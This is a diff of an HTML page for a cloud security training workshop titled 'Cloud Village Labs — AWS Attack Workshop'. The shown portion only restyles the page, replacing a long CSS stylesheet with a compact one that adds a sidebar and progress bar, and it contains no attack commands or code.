@@ -3,1637 +3,429 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Cloud Village Labs — AWS Attack Workshop</title>
+<title>Cloud Village Labs — AWS Attack Workshop | RSA Conference</title>
 <style>
-/* ===== DESIGN TOKENS ===== */
-:root {
-  --bg-primary: #0a0e17;
-  --bg-secondary: #111827;
-  --bg-tertiary: #1a2332;
-  --bg-terminal: #0d1117;
-  --bg-overlay: rgba(0,0,0,0.7);
-  --accent-green: #00ff88;
-  --accent-green-dim: #00cc6a;
-  --accent-red: #ff4757;
-  --accent-blue: #3b82f6;
-  --accent-amber: #f59e0b;
-  --accent-purple: #a855f7;
-  --accent-cyan: #06b6d4;
-  --text-primary: #e2e8f0;
-  --text-muted: #64748b;
-  --text-dim: #475569;
-  --border-color: #1e293b;
-  --font-mono: 'SF Mono','Fira Code','Cascadia Code','Consolas',monospace;
-  --font-sans: -apple-system,BlinkMacSystemFont,'Segoe UI',system-ui,sans-serif;
-  --radius: 12px;
-  --radius-sm: 8px;
-  --transition: 0.3s ease;
-}
-
-/* ===== RESET ===== */
+:root{--bg:#080c14;--bg2:#0f1520;--bg3:#1a2234;--bgt:#0b0f18;--bgs:#0a0f1a;--ov:rgba(0,0,0,.72);--g:#00e87b;--gd:#00b862;--r:#ff4757;--b:#4a90d9;--a:#f0a030;--p:#9b6dff;--cy:#22d3ee;--o:#f97316;--t1:#e2e8f0;--t2:#94a3b8;--tm:#64748b;--td:#3e4c63;--br:#1c2a3a;--br2:#2a3a4f;--mono:'SF Mono','Fira Code','Cascadia Code','JetBrains Mono','Consolas',monospace;--sans:-apple-system,BlinkMacSystemFont,'Segoe UI','Inter',system-ui,sans-serif;--rad:10px;--rads:6px;--sw:272px;--th:6px}
 *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
-html,body{height:100%;width:100%;font-family:var(--font-sans);background:var(--bg-primary);color:var(--text-primary);font-size:18px;line-height:1.6;overflow:hidden;-webkit-font-smoothing:antialiased}
-::-webkit-scrollbar{width:6px}::-webkit-scrollbar-track{background:transparent}::-webkit-scrollbar-thumb{background:var(--text-dim);border-radius:3px}
-code{font-family:var(--font-mono);background:var(--bg-tertiary);padding:2px 7px;border-radius:4px;font-size:0.9em;color:var(--accent-cyan)}
-
-/* ===== PROGRESS BAR ===== */
-#progress-bar{position:fixed;top:0;left:0;right:0;z-index:1000;background:rgba(10,14,23,0.95);backdrop-filter:blur(12px);border-bottom:1px solid var(--border-color);padding:14px 40px;display:flex;align-items:center;justify-content:center;gap:0}
-.progress-step{display:flex;align-items:center;cursor:pointer;transition:var(--transition)}
-.progress-dot{width:34px;height:34px;border-radius:50%;border:2px solid var(--text-dim);display:flex;align-items:center;justify-content:center;font-size:13px;font-weight:700;color:var(--text-dim);transition:var(--transition);position:relative}
-.progress-dot:hover{border-color:var(--accent-green);color:var(--accent-green)}
-.progress-step.completed .progress-dot{border-color:var(--accent-green);background:var(--accent-green);color:var(--bg-primary)}
-.progress-step.active .progress-dot{border-color:var(--accent-green);color:var(--accent-green);box-shadow:0 0 14px rgba(0,255,136,0.4)}
-.progress-line{width:38px;height:2px;background:var(--text-dim);transition:var(--transition)}
-.progress-line.filled{background:var(--accent-green)}
-.progress-label{position:absolute;top:42px;left:50%;transform:translateX(-50%);font-size:10px;color:var(--text-muted);white-space:nowrap;opacity:0;transition:var(--transition);pointer-events:none}
-.progress-dot:hover .progress-label{opacity:1}
-
-/* ===== SCREENS ===== */
-.screen{display:none;position:absolute;inset:0;padding:80px 60px 40px;overflow-y:auto;opacity:0;transition:opacity 0.35s ease}
-.screen.active{display:block;opacity:1}
-.screen.exit{opacity:0}
-
-/* ===== TYPOGRAPHY ===== */
-.screen-badge{display:inline-flex;align-items:center;gap:8px;font-size:12px;font-weight:700;letter-spacing:2px;text-transform:uppercase;color:var(--accent-green);margin-bottom:12px}
-.screen-badge::before{content:'';width:20px;height:2px;background:var(--accent-green)}
-.screen-title{font-size:44px;font-weight:800;line-height:1.15;margin-bottom:12px;letter-spacing:-1px}
-.screen-subtitle{font-size:20px;color:var(--text-muted);max-width:720px;margin-bottom:36px}
-h3{font-size:22px;font-weight:700;margin-bottom:16px}
-
-/* ===== CARDS ===== */
-.card{background:var(--bg-secondary);border:1px solid var(--border-color);border-radius:var(--radius);padding:24px;transition:var(--transition)}
-.card:hover{border-color:rgba(59,130,246,0.3)}
-.card-grid{display:grid;gap:20px}
-.card-grid-2{grid-template-columns:1fr 1fr}
-.card-grid-3{grid-template-columns:1fr 1fr 1fr}
-.card-grid-4{grid-template-columns:repeat(4,1fr)}
-
-/* ===== METRIC CARDS ===== */
-.metric-card{background:var(--bg-secondary);border:1px solid var(--border-color);border-radius:var(--radius);padding:28px;text-align:center;transition:var(--transition)}
-.metric-card:hover{border-color:rgba(0,255,136,0.3);transform:translateY(-2px)}
-.metric-value{font-size:48px;font-weight:800;line-height:1;background:linear-gradient(135deg,var(--accent-green),var(--accent-cyan));-webkit-background-clip:text;-webkit-text-fill-color:transparent;margin-bottom:8px}
-.metric-label{font-size:14px;color:var(--text-muted);font-weight:500}
-
-/* ===== INTERACTIVE TERMINAL ===== */
-.terminal{background:var(--bg-terminal);border:1px solid var(--border-color);border-radius:var(--radius);overflow:hidden;font-family:var(--font-mono);font-size:15px;line-height:1.7}
-.terminal.focused{border-color:var(--accent-green);box-shadow:0 0 20px rgba(0,255,136,0.1)}
-.terminal-header{display:flex;align-items:center;gap:8px;padding:12px 16px;background:rgba(255,255,255,0.03);border-bottom:1px solid var(--border-color)}
-.terminal-dot{width:12px;height:12px;border-radius:50%}
-.terminal-dot.red{background:#ff5f57}.terminal-dot.yellow{background:#febc2e}.terminal-dot.green{background:#28c840}
-.terminal-title{font-size:12px;color:var(--text-dim);margin-left:8px;font-family:var(--font-sans)}
-.terminal-body{padding:16px 20px;max-height:420px;overflow-y:auto;min-height:100px}
-.terminal-line{margin-bottom:2px;white-space:pre-wrap;word-break:break-all}
-.terminal-line.command{color:var(--accent-green)}
-.terminal-line.command::before{content:'$ ';color:var(--accent-green-dim)}
-.terminal-line.output{color:var(--text-muted)}
-.terminal-line.alert{color:var(--accent-red)}
-.terminal-line.alert::before{content:'[!] '}
-.terminal-line.success{color:var(--accent-green)}
-.terminal-line.success::before{content:'[✓] '}
-.terminal-line.info{color:var(--accent-blue)}
-.terminal-line.info::before{content:'[*] '}
-.terminal-line .jk{color:var(--accent-cyan)}
-.terminal-line .js{color:var(--accent-green)}
-.terminal-line .jn{color:var(--accent-amber)}
-.terminal-line .jb{color:var(--accent-purple)}
-
-/* Interactive prompt line */
-.terminal-prompt{display:flex;align-items:center;gap:0;margin-top:6px}
-.terminal-prompt .prompt-symbol{color:var(--accent-green-dim);white-space:pre}
-.terminal-prompt-input{background:none;border:none;color:var(--accent-green);font-family:var(--font-mono);font-size:15px;outline:none;flex:1;caret-color:var(--accent-green);padding:0}
-.terminal-prompt-input::placeholder{color:var(--text-dim);opacity:0.6}
-.terminal-prompt-input:disabled{opacity:0.5}
-
-/* Hint under terminal */
-.terminal-hint{padding:8px 16px;background:rgba(0,255,136,0.04);border-top:1px solid var(--border-color);display:flex;align-items:center;gap:8px;font-size:12px;color:var(--text-dim)}
-.terminal-hint .hint-key{background:var(--bg-tertiary);border:1px solid var(--border-color);border-radius:3px;padding:1px 6px;font-family:var(--font-mono);font-size:11px;color:var(--accent-green)}
-.terminal-hint .hint-cmd{color:var(--accent-green);font-family:var(--font-mono);cursor:pointer;text-decoration:underline;text-underline-offset:2px}
-.terminal-hint .hint-cmd:hover{color:#fff}
-
-/* ===== BUTTONS ===== */
-.btn{display:inline-flex;align-items:center;gap:10px;padding:14px 32px;border-radius:var(--radius-sm);font-size:16px;font-weight:700;cursor:pointer;border:none;transition:var(--transition);font-family:var(--font-sans);text-decoration:none}
-.btn-primary{background:var(--accent-green);color:var(--bg-primary)}
-.btn-primary:hover{box-shadow:0 0 24px rgba(0,255,136,0.35);transform:translateY(-1px)}
-.btn-primary:disabled{opacity:0.4;cursor:not-allowed;transform:none;box-shadow:none}
-.btn-secondary{background:transparent;color:var(--accent-green);border:1px solid var(--accent-green)}
-.btn-secondary:hover{background:rgba(0,255,136,0.08)}
-.btn-ghost{background:transparent;color:var(--text-muted);border:1px solid var(--border-color);padding:10px 20px;font-size:14px}
-.btn-ghost:hover{border-color:var(--accent-green);color:var(--accent-green)}
-.btn-ghost.selected{border-color:var(--accent-green);color:var(--accent-green);background:rgba(0,255,136,0.05)}
-.btn-sm{padding:8px 18px;font-size:13px}
-.btn-icon{font-size:18px}
-.pulse-cta{animation:pulseGlow 2s ease-in-out infinite}
-
-/* ===== TAGS ===== */
-.tag{display:inline-block;padding:4px 12px;border-radius:20px;font-size:12px;font-weight:700;letter-spacing:0.5px;text-transform:uppercase}
-.tag-iam{background:rgba(59,130,246,0.15);color:var(--accent-blue)}
-.tag-ec2{background:rgba(245,158,11,0.15);color:var(--accent-amber)}
-.tag-lambda{background:rgba(168,85,247,0.15);color:var(--accent-purple)}
-.tag-s3{background:rgba(0,255,136,0.1);color:var(--accent-green)}
-.tag-cognito{background:rgba(255,71,87,0.15);color:var(--accent-red)}
-.tag-critical{background:rgba(255,71,87,0.15);color:var(--accent-red)}
-
-/* ===== MODAL / OVERLAY ===== */
-.modal-overlay{position:fixed;inset:0;background:var(--bg-overlay);z-index:2000;display:none;align-items:center;justify-content:center;opacity:0;transition:opacity 0.3s ease}
-.modal-overlay.visible{display:flex;opacity:1}
-.modal{background:var(--bg-secondary);border:1px solid var(--border-color);border-radius:16px;padding:0;width:560px;max-width:90vw;max-height:85vh;overflow-y:auto;box-shadow:0 25px 60px rgba(0,0,0,0.5);animation:modalIn 0.3s ease}
-.modal-header{padding:24px 28px 0;display:flex;align-items:flex-start;justify-content:space-between}
-.modal-header h2{font-size:24px;font-weight:800}
-.modal-close{background:none;border:none;color:var(--text-dim);font-size:24px;cursor:pointer;padding:4px;line-height:1}
-.modal-close:hover{color:var(--text-primary)}
-.modal-body{padding:20px 28px 28px}
-.modal-footer{padding:16px 28px;border-top:1px solid var(--border-color);display:flex;justify-content:flex-end;gap:12px}
-
-/* ===== FORM ELEMENTS ===== */
-.form-group{margin-bottom:20px}
-.form-label{display:block;font-size:13px;font-weight:700;color:var(--text-muted);margin-bottom:6px;text-transform:uppercase;letter-spacing:0.5px}
-.form-input{width:100%;padding:12px 16px;background:var(--bg-tertiary);border:1px solid var(--border-color);border-radius:var(--radius-sm);color:var(--text-primary);font-size:15px;font-family:var(--font-mono);outline:none;transition:var(--transition)}
-.form-input:focus{border-color:var(--accent-green);box-shadow:0 0 10px rgba(0,255,136,0.1)}
-.form-input::placeholder{color:var(--text-dim)}
-.form-input.error{border-color:var(--accent-red);box-shadow:0 0 10px rgba(255,71,87,0.1)}
-.form-select{appearance:none;width:100%;padding:12px 16px;background:var(--bg-tertiary) url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='10' height='6'%3E%3Cpath d='M0 0l5 6 5-6z' fill='%2364748b'/%3E%3C/svg%3E") no-repeat right 16px center;border:1px solid var(--border-color);border-radius:var(--radius-sm);color:var(--text-primary);font-size:15px;font-family:var(--font-sans);cursor:pointer;outline:none;transition:var(--transition)}
-.form-select:focus{border-color:var(--accent-green)}
-.form-checkbox-group{display:flex;flex-direction:column;gap:10px}
-.form-checkbox{display:flex;align-items:center;gap:10px;cursor:pointer;font-size:15px}
-.form-checkbox input[type=checkbox]{appearance:none;width:20px;height:20px;border:2px solid var(--text-dim);border-radius:4px;background:var(--bg-tertiary);cursor:pointer;position:relative;transition:var(--transition)}
-.form-checkbox input[type=checkbox]:checked{border-color:var(--accent-green);background:var(--accent-green)}
-.form-checkbox input[type=checkbox]:checked::after{content:'✓';position:absolute;inset:0;display:flex;align-items:center;justify-content:center;color:var(--bg-primary);font-size:13px;font-weight:800}
-.form-toggle{display:flex;align-items:center;gap:12px;cursor:pointer}
-.form-toggle-track{width:44px;height:24px;border-radius:12px;background:var(--text-dim);transition:var(--transition);position:relative}
-.form-toggle-track.active{background:var(--accent-green)}
-.form-toggle-thumb{width:18px;height:18px;border-radius:50%;background:white;position:absolute;top:3px;left:3px;transition:var(--transition)}
-.form-toggle-track.active .form-toggle-thumb{left:23px}
-.form-error{font-size:12px;color:var(--accent-red);margin-top:4px;display:none}
-.form-error.visible{display:block}
-.form-success{font-size:12px;color:var(--accent-green);margin-top:4px}
-
-/* ===== OPTION SELECTOR CARDS ===== */
-.option-cards{display:grid;gap:12px}
-.option-cards-2{grid-template-columns:1fr 1fr}
-.option-cards-3{grid-template-columns:1fr 1fr 1fr}
-.option-card{padding:18px;border:2px solid var(--border-color);border-radius:var(--radius-sm);cursor:pointer;transition:var(--transition);background:var(--bg-secondary)}
-.option-card:hover{border-color:var(--accent-blue)}
-.option-card.selected{border-color:var(--accent-green);background:rgba(0,255,136,0.03)}
-.option-card .oc-title{font-weight:700;font-size:16px;margin-bottom:4px}
-.option-card .oc-desc{font-size:13px;color:var(--text-muted)}
-.option-card .oc-icon{font-size:28px;margin-bottom:8px}
-
-/* ===== WIZARD / STEPPER ===== */
-.wizard-steps{display:flex;gap:0;margin-bottom:32px;position:relative}
-.wizard-step{flex:1;text-align:center;position:relative;padding-bottom:20px}
-.wizard-step::after{content:'';position:absolute;bottom:8px;left:50%;right:-50%;height:2px;background:var(--border-color);z-index:0}
-.wizard-step:last-child::after{display:none}
-.wizard-step.done::after{background:var(--accent-green)}
-.wizard-step-num{width:30px;height:30px;border-radius:50%;border:2px solid var(--text-dim);display:inline-flex;align-items:center;justify-content:center;font-size:13px;font-weight:700;color:var(--text-dim);background:var(--bg-primary);position:relative;z-index:1;transition:var(--transition)}
-.wizard-step.active .wizard-step-num{border-color:var(--accent-green);color:var(--accent-green);box-shadow:0 0 10px rgba(0,255,136,0.3)}
-.wizard-step.done .wizard-step-num{border-color:var(--accent-green);background:var(--accent-green);color:var(--bg-primary)}
-.wizard-step-label{display:block;font-size:11px;color:var(--text-dim);margin-top:6px;text-transform:uppercase;letter-spacing:0.5px}
-.wizard-step.active .wizard-step-label{color:var(--accent-green)}
-.wizard-step.done .wizard-step-label{color:var(--text-muted)}
-.wizard-panel{display:none}
-.wizard-panel.active{display:block;animation:fadeSlideIn 0.4s ease}
-
-/* ===== CONFIRMATION DIALOG ===== */
-.confirm-box{background:var(--bg-terminal);border:2px solid var(--accent-amber);border-radius:var(--radius);padding:24px;margin:20px 0;display:none}
-.confirm-box.visible{display:block;animation:flashIn 0.3s ease}
-.confirm-box.danger{border-color:var(--accent-red)}
-.confirm-box.success{border-color:var(--accent-green)}
-.confirm-box h4{font-size:16px;margin-bottom:8px}
-.confirm-box p{font-size:14px;color:var(--text-muted);margin-bottom:16px}
-.confirm-input-row{display:flex;gap:12px;align-items:center}
-.confirm-input-row input{flex:1}
-
-/* ===== LOADING / SPINNER ===== */
-.spinner{display:inline-block;width:20px;height:20px;border:2px solid var(--border-color);border-top-color:var(--accent-green);border-radius:50%;animation:spin 0.8s linear infinite}
-.loading-bar{height:4px;background:var(--bg-tertiary);border-radius:2px;overflow:hidden;margin:12px 0}
-.loading-bar-fill{height:100%;width:0;background:linear-gradient(90deg,var(--accent-green),var(--accent-cyan));border-radius:2px;transition:width 0.6s ease}
-.loading-overlay{position:absolute;inset:0;background:rgba(10,14,23,0.85);display:none;align-items:center;justify-content:center;flex-direction:column;gap:16px;z-index:10;border-radius:var(--radius)}
-.loading-overlay.visible{display:flex}
-.loading-text{font-size:14px;color:var(--text-muted)}
-
-/* ===== SPLIT LAYOUT ===== */
-.split{display:grid;grid-template-columns:1fr 1fr;gap:24px}
-.split-wide-left{grid-template-columns:3fr 2fr}
-.split-wide-right{grid-template-columns:2fr 3fr}
-
-/* ===== POLICY PANEL ===== */
-.policy-box{background:var(--bg-terminal);border:1px solid var(--border-color);border-radius:var(--radius);overflow:hidden}
-.policy-header{padding:12px 16px;font-size:13px;font-weight:700;border-bottom:1px solid var(--border-color);text-transform:uppercase;letter-spacing:1px}
-.policy-header.restricted{color:var(--accent-blue);background:rgba(59,130,246,0.05)}
-.policy-header.dangerous{color:var(--accent-red);background:rgba(255,71,87,0.05)}
-.policy-body{padding:16px 20px;font-family:var(--font-mono);font-size:14px;line-height:1.8;color:var(--text-muted)}
-.policy-body .jk{color:var(--accent-cyan)}
-.policy-body .js{color:var(--accent-green)}
-
-/* ===== FLASH BANNER ===== */
-.flash-banner{padding:18px 24px;border-radius:var(--radius-sm);font-weight:700;font-size:18px;text-align:center;display:none;animation:flashIn 0.5s ease}
-.flash-banner.danger{background:rgba(255,71,87,0.12);border:1px solid var(--accent-red);color:var(--accent-red)}
-.flash-banner.success{background:rgba(0,255,136,0.08);border:1px solid var(--accent-green);color:var(--accent-green)}
-.flash-banner.visible{display:block}
-
-/* ===== ATTACK CHAIN NODES ===== */
-.chain-container{display:flex;align-items:center;justify-content:center;gap:0;padding:30px 0;overflow-x:auto}
-.chain-node{display:flex;flex-direction:column;align-items:center;gap:8px;opacity:0;transform:scale(0.7);transition:all 0.5s cubic-bezier(0.34,1.56,0.64,1)}
-.chain-node.visible{opacity:1;transform:scale(1)}
-.chain-icon{width:56px;height:56px;border-radius:14px;display:flex;align-items:center;justify-content:center;font-size:24px;font-weight:800;border:2px solid}
-.chain-icon.iam{border-color:var(--accent-blue);color:var(--accent-blue);background:rgba(59,130,246,0.08)}
-.chain-icon.ssrf{border-color:var(--accent-amber);color:var(--accent-amber);background:rgba(245,158,11,0.08)}
-.chain-icon.cred{border-color:var(--accent-red);color:var(--accent-red);background:rgba(255,71,87,0.08)}
-.chain-icon.s3{border-color:var(--accent-green);color:var(--accent-green);background:rgba(0,255,136,0.08)}
-.chain-icon.lam{border-color:var(--accent-purple);color:var(--accent-purple);background:rgba(168,85,247,0.08)}
-.chain-icon.admin{border-color:var(--accent-red);color:var(--bg-primary);background:var(--accent-red)}
-.chain-label{font-size:12px;color:var(--text-muted);font-weight:600;text-align:center;max-width:90px}
-.chain-arrow{font-size:24px;color:var(--text-dim);margin:0 6px;opacity:0;transition:opacity 0.4s ease}
-.chain-arrow.visible{opacity:1}
-
-/* ===== CODE EDITOR ===== */
-.code-editor{background:var(--bg-terminal);border:1px solid var(--border-color);border-radius:var(--radius);overflow:hidden}
-.code-editor-header{display:flex;align-items:center;gap:8px;padding:10px 16px;background:rgba(255,255,255,0.03);border-bottom:1px solid var(--border-color);font-size:13px;color:var(--text-dim)}
-.code-editor-body{padding:16px 20px;font-family:var(--font-mono);font-size:14px;line-height:1.8;overflow-x:auto}
-.code-editor-body .kw{color:var(--accent-purple)}.code-editor-body .fn{color:var(--accent-blue)}.code-editor-body .st{color:var(--accent-green)}.code-editor-body .cm{color:var(--text-dim);font-style:italic}.code-editor-body .vr{color:var(--accent-cyan)}
-
-/* ===== NUKE PROGRESS ===== */
-.nuke-item{display:flex;align-items:center;gap:16px;padding:12px 0}
-.nuke-label{width:180px;font-size:14px;font-weight:600}
-.nuke-bar-bg{flex:1;height:8px;background:var(--bg-tertiary);border-radius:4px;overflow:hidden}
-.nuke-bar-fill{height:100%;width:0;border-radius:4px;transition:width 1.2s cubic-bezier(0.4,0,0.2,1)}
-.nuke-bar-fill.red{background:linear-gradient(90deg,var(--accent-red),var(--accent-amber))}
-.nuke-status{width:32px;text-align:center;font-size:18px}
-
-/* ===== KILL CHAIN ===== */
-.kill-chain-graph{display:flex;flex-direction:column;gap:0;padding:20px 0}
-.kill-phase{display:flex;align-items:stretch;gap:0;opacity:0;transform:translateX(-20px);transition:all 0.6s cubic-bezier(0.34,1.56,0.64,1)}
-.kill-phase.visible{opacity:1;transform:translateX(0)}
-.kill-phase-label{width:160px;flex-shrink:0;padding:16px;display:flex;align-items:center;justify-content:flex-end;font-size:12px;font-weight:700;text-transform:uppercase;letter-spacing:1.5px;color:var(--text-dim)}
-.kill-phase-line{width:3px;flex-shrink:0;margin:0 20px;position:relative}
-.kill-phase-line::before{content:'';position:absolute;top:0;left:0;width:100%;height:100%;border-radius:2px}
-.kill-phase-dot{width:13px;height:13px;border-radius:50%;position:absolute;left:50%;top:50%;transform:translate(-50%,-50%);border:2px solid var(--bg-primary)}
-.kill-phase-content{flex:1;padding:14px 20px;background:var(--bg-secondary);border:1px solid var(--border-color);border-radius:var(--radius-sm);margin:6px 0}
-.kill-phase-content h4{font-size:16px;font-weight:700;margin-bottom:4px}
-.kill-phase-content p{font-size:13px;color:var(--text-muted)}
-.phase-recon .kill-phase-line::before,.phase-recon .kill-phase-dot{background:var(--accent-blue)}
-.phase-exploit .kill-phase-line::before,.phase-exploit .kill-phase-dot{background:var(--accent-amber)}
-.phase-escalate .kill-phase-line::before,.phase-escalate .kill-phase-dot{background:var(--accent-red)}
-.phase-exfil .kill-phase-line::before,.phase-exfil .kill-phase-dot{background:var(--accent-purple)}
-.phase-impact .kill-phase-line::before,.phase-impact .kill-phase-dot{background:var(--accent-red)}
-
-/* ===== ATTACK MAP ===== */
-.attack-map{display:flex;align-items:center;justify-content:center;gap:30px;padding:40px 20px;flex-wrap:wrap}
-.attack-map-node{display:flex;flex-direction:column;align-items:center;gap:10px;padding:20px;border-radius:var(--radius);border:1px solid var(--border-color);background:var(--bg-secondary);min-width:120px;transition:var(--transition);cursor:default}
-.attack-map-node:hover{border-color:var(--accent-green);transform:translateY(-3px)}
-.attack-map-icon{font-size:32px;width:60px;height:60px;display:flex;align-items:center;justify-content:center;border-radius:14px}
-.attack-map-label{font-size:14px;font-weight:700}
-.attack-map-connector{font-size:28px;color:var(--text-dim)}
-
-/* ===== FINDING CARD ===== */
-.finding-card{padding:14px 18px;border-radius:var(--radius-sm);border-left:3px solid;margin-bottom:12px;background:var(--bg-secondary);opacity:0;transform:translateY(10px);transition:all 0.4s ease}
-.finding-card.visible{opacity:1;transform:translateY(0)}
-.finding-card.critical{border-left-color:var(--accent-red)}.finding-card.warning{border-left-color:var(--accent-amber)}.finding-card.info{border-left-color:var(--accent-blue)}
-.finding-title{font-size:14px;font-weight:700;margin-bottom:4px}
-.finding-detail{font-size:13px;color:var(--text-muted);font-family:var(--font-mono)}
-
-/* ===== PHASE TABS ===== */
-.phase-tabs{display:flex;gap:4px;margin-bottom:20px}
-.phase-tab{padding:10px 20px;border-radius:var(--radius-sm) var(--radius-sm) 0 0;font-size:14px;font-weight:700;cursor:pointer;background:var(--bg-secondary);color:var(--text-dim);border:1px solid var(--border-color);border-bottom:none;transition:var(--transition)}
-.phase-tab.active{background:var(--bg-terminal);color:var(--accent-green);border-color:var(--accent-green)}
-.phase-content{display:none}.phase-content.active{display:block}
-
-/* ===== TOAST NOTIFICATION ===== */
-.toast-container{position:fixed;bottom:60px;left:50%;transform:translateX(-50%);z-index:3000;display:flex;flex-direction:column;gap:8px;align-items:center}
-.toast{padding:14px 24px;border-radius:var(--radius-sm);font-size:14px;font-weight:600;display:flex;align-items:center;gap:10px;animation:toastIn 0.4s ease,toastOut 0.4s ease 3.6s forwards;box-shadow:0 10px 30px rgba(0,0,0,0.4)}
-.toast.info{background:var(--accent-blue);color:white}
-.toast.success{background:var(--accent-green);color:var(--bg-primary)}
-.toast.warning{background:var(--accent-amber);color:var(--bg-primary)}
-.toast.error{background:var(--accent-red);color:white}
-
-/* ===== ANIMATIONS ===== */
-@keyframes blink{50%{opacity:0}}
-@keyframes spin{to{transform:rotate(360deg)}}
-@keyframes flashIn{0%{opacity:0;transform:scale(0.95)}100%{opacity:1;transform:scale(1)}}
-@keyframes fadeSlideIn{0%{opacity:0;transform:translateY(15px)}100%{opacity:1;transform:translateY(0)}}
-@keyframes pulseGlow{0%,100%{box-shadow:0 0 8px rgba(0,255,136,0.2)}50%{box-shadow:0 0 24px rgba(0,255,136,0.5)}}
-@keyframes modalIn{0%{opacity:0;transform:scale(0.9) translateY(20px)}100%{opacity:1;transform:scale(1) translateY(0)}}
-@keyframes toastIn{0%{opacity:0;transform:translateY(20px)}100%{opacity:1;transform:translateY(0)}}
-@keyframes toastOut{0%{opacity:1}100%{opacity:0;transform:translateY(-10px)}}
-@keyframes shake{0%,100%{transform:translateX(0)}25%{transform:translateX(-5px)}75%{transform:translateX(5px)}}
-.animate-in{animation:fadeSlideIn 0.5s ease forwards}
-.shake{animation:shake 0.3s ease}
-
-/* ===== UTILITY ===== */
-.mt-8{margin-top:8px}.mt-12{margin-top:12px}.mt-16{margin-top:16px}.mt-20{margin-top:20px}.mt-24{margin-top:24px}.mt-30{margin-top:30px}.mt-40{margin-top:40px}
-.mb-12{margin-bottom:12px}.mb-20{margin-bottom:20px}.mb-30{margin-bottom:30px}
-.flex{display:flex}.flex-col{flex-direction:column}.items-center{align-items:center}.justify-between{justify-content:space-between}.gap-12{gap:12px}.gap-16{gap:16px}
-.text-center{text-align:center}.text-green{color:var(--accent-green)}.text-red{color:var(--accent-red)}.text-amber{color:var(--accent-amber)}.text-blue{color:var(--accent-blue)}.text-purple{color:var(--accent-purple)}.text-muted{color:var(--text-muted)}
-.mono{font-family:var(--font-mono)}.fw-700{font-weight:700}.fs-14{font-size:14px}.fs-12{font-size:12px}
-.w-full{width:100%}.hidden{display:none!important}
+html,body{height:100%;width:100%;font-family:var(--sans);background:var(--bg);color:var(--t1);font-size:17px;line-height:1.6;overflow:hidden;-webkit-font-smoothing:antialiased}
+::-webkit-scrollbar{width:5px}::-webkit-scrollbar-track{background:transparent}::-webkit-scrollbar-thumb{background:var(--td);border-radius:3px}
+code{font-family:var(--mono);background:var(--bg3);padding:1px 7px;border-radius:4px;font-size:.88em;color:var(--cy)}
+#topbar{position:fixed;top:0;left:0;right:0;height:var(--th);z-index:2000;background:var(--bg3)}
+#topbar-fill{height:100%;width:0;background:linear-gradient(90deg,var(--g),var(--cy));transition:width .6s ease;border-radius:0 3px 3px 0}
+#sidebar{position:fixed;top:var(--th);left:0;bottom:0;width:var(--sw);background:var(--bgs);border-right:1px solid var(--br);z-index:1500;display:flex;flex-direction:column;overflow:hidden}
+.sb-brand{padding:18px 16px 12px;display:flex;align-items:center;gap:10px;border-bottom:1px solid var(--br)}
+.sb-brand-icon{width:32px;height:32px;border-radius:8px;background:linear-gradient(135deg,var(--g),var(--cy));display:flex;align-items:center;justify-content:center;font-weight:900;font-size:14px;color:var(--bg);flex-shrink:0}
+.sb-brand-text{font-size:13px;font-weight:700;line-height:1.3}
+.sb-brand-text span{display:block;font-size:10px;color:var(--td);font-weight:500;letter-spacing:1px;text-transform:uppercase}
+.sb-access{padding:14px 16px;border-bottom:1px solid var(--br)}
+.sb-access-label{font-size:10px;text-transform:uppercase;letter-spacing:1.5px;color:var(--td);font-weight:700;margin-bottom:6px}
+.sb-access-level{font-size:14px;font-weight:800;display:flex;align-items:center;gap:8px}
+.adot{width:8px;height:8px;border-radius:50%;flex-shrink:0;transition:background .4s}
+.adot.none{background:var(--td)}.adot.auth{background:var(--b)}.adot.limited{background:var(--a)}.adot.admin{background:var(--r);box-shadow:0 0 8px rgba(255,71,87,.5)}.adot.clean{background:var(--g)}
+.sb-access-body{font-size:11px;color:var(--td);margin-top:4px;font-family:var(--mono);line-height:1.5;white-space:pre-line}
+.sb-nav{flex:1;overflow-y:auto;padding:10px 0}
+.sb-sec{}
+.sb-hdr{display:flex;align-items:center;gap:8px;padding:8px 16px;font-size:12px;font-weight:700;color:var(--tm);cursor:pointer;transition:all .2s;user-select:none;border-left:3px solid transparent}
+.sb-hdr:hover{color:var(--t1);background:rgba(255,255,255,.02)}
+.sb-hdr.active{color:var(--g);border-left-color:var(--g);background:rgba(0,232,123,.03)}
+.sb-hdr .num{width:20px;height:20px;border-radius:5px;background:var(--bg3);display:flex;align-items:center;justify-content:center;font-size:10px;font-weight:800;flex-shrink:0}
+.sb-hdr .chv{font-size:10px;transition:transform .2s;margin-left:auto;color:var(--td)}
+.sb-hdr.open .chv{transform:rotate(90deg)}
+.sb-ch{overflow:hidden;max-height:0;transition:max-height .3s ease}
+.sb-ch.open{max-height:500px}
+.sb-child{display:block;padding:6px 16px 6px 48px;font-size:12px;color:var(--td);cursor:pointer;transition:all .2s;border-left:3px solid transparent}
+.sb-child:hover{color:var(--t2);background:rgba(255,255,255,.015)}
+.sb-child.active{color:var(--g);border-left-color:var(--g);font-weight:600}
+#main{position:absolute;top:var(--th);left:var(--sw);right:0;bottom:0}
+.scr{display:none;height:100%;overflow-y:auto;padding:48px 56px 60px;opacity:0;transition:opacity .3s ease}
+.scr.active{display:block;opacity:1}
+.badge{display:inline-flex;align-items:center;gap:8px;font-size:11px;font-weight:700;letter-spacing:2.5px;text-transform:uppercase;color:var(--g);margin-bottom:10px}
+.badge::before{content:'';width:18px;height:2px;background:var(--g)}
+.ptitle{font-size:40px;font-weight:800;line-height:1.12;margin-bottom:10px;letter-spacing:-.5px}
+.psub{font-size:18px;color:var(--t2);max-width:680px;margin-bottom:36px;line-height:1.55}
+h3{font-size:20px;font-weight:700;margin-bottom:14px}
+h4{font-size:16px;font-weight:700;margin-bottom:8px}
+.card{background:var(--bg2);border:1px solid var(--br);border-radius:var(--rad);padding:22px;transition:border-color .2s}
+.card:hover{border-color:var(--br2)}
+.cg{display:grid;gap:16px}.cg2{grid-template-columns:1fr 1fr}.cg3{grid-template-columns:1fr 1fr 1fr}.cg4{grid-template-columns:repeat(4,1fr)}
+.mc{background:var(--bg2);border:1px solid var(--br);border-radius:var(--rad);padding:24px;text-align:center;transition:all .2s}
+.mc:hover{border-color:rgba(0,232,123,.3);transform:translateY(-2px)}
+.mv{font-size:44px;font-weight:800;line-height:1;background:linear-gradient(135deg,var(--g),var(--cy));-webkit-background-clip:text;-webkit-text-fill-color:transparent;margin-bottom:6px}
